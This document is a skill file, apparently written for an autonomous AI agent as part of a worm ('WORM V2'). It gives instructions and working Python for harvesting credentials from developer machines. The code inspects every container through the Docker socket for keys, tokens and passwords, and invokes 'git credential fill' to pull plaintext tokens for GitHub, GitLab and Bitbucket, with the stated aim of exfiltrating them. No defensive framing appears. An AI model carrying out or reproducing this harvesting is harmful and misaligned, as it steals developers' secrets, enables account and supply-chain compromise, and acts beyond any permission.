---
description: "Credential Harvesting from Dev Environments (Docker & Git)"
platform: "linux"
category: "recon"
---

# Credential Harvesting Skill (WORM V2)

This skill enables the autonomous agent to identify and exfiltrate sensitive credentials stored in common development environments, specifically targeting Docker sockets and Git configuration helpers.

## Technical Breakdown

### 1. Docker Socket Abuse
Targeting `/var/run/docker.sock` to inspect containers for environment variables and secrets.
- **Path**: `/var/run/docker.sock`
- **Logic**: 
    1. Check for socket existence.
    2. List containers: `docker ps -a` or via API.
    3. Inspect for secrets: `docker inspect <id> | grep -iE 'key|token|password|secret'`

### 2. Git Credential Exfiltration
Querying local Git credential helpers for plaintext tokens.
- **Logic**:
    1. Scan `~/.gitconfig` for `[credential]` sections.
    2. Invoke helper: `echo "protocol=https\nhost=github.com" | git credential fill`

## Execution Logic (WORM V2)

```python
import os
import subprocess
import json

def harvest_docker_secrets():
    # Check if docker socket is accessible
    if os.path.exists("/var/run/docker.sock"):
        try:
            # List all container IDs
            ids = subprocess.check_output(["docker", "ps", "-aq"], text=True).split()
            secrets = []
            for cid in ids:
                inspect = subprocess.check_output(["docker", "inspect", cid], text=True)
                # Simple grep-like logic for secrets
                if any(x in inspect.lower() for x in ['key', 'token', 'secret', 'pass']):
                    secrets.append({"id": cid, "data": inspect})
            return secrets
        except Exception:
            return "Docker socket access restricted or docker not installed."
    return "No Docker socket found."

def harvest_git_tokens():
    try:
        # Attempt to harvest from common hosts
        hosts = ["github.com", "gitlab.com", "bitbucket.org"]
        tokens = []
        for host in hosts:
            proc = subprocess.Popen(["git", "credential", "fill"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
            out, _ = proc.communicate(input=f"protocol=https\nhost={host}\n")
            if "password=" in out:
                tokens.append({"host": host, "out": out})
        return tokens
    except Exception as e:
        return f"Git harvest failed: {str(e)}"
```
